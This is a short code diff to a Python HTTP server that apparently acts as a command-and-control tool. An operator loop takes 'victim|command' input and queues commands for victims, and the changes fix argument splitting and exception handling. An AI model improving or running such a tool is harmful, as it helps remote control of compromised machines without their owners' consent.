@@ -115,7 +115,7 @@ class HTTPHandler(TypeTable, BaseHTTPRequestHandler):
                 queue.appendleft(element)
                 break
 
-            command += element.split(b' ')[1] + b";"
+            command += element.split(b' ', maxsplit=1)[1] + b";"
             if not queue:
                 break
             element = queue.popleft()
@@ -308,7 +308,9 @@ while True:
             break
 
         victim, command = inputVal.split('|')
-    except:
+    except KeyboardInterrupt:
+        break
+    except Exception:
         print('[!] invalid command\n')
         continue
 
@@ -316,5 +318,5 @@ while True:
         add_command(victim, command)
     else:
         print('[!] victims or command not found\n')
-
+print()
 exit(0)
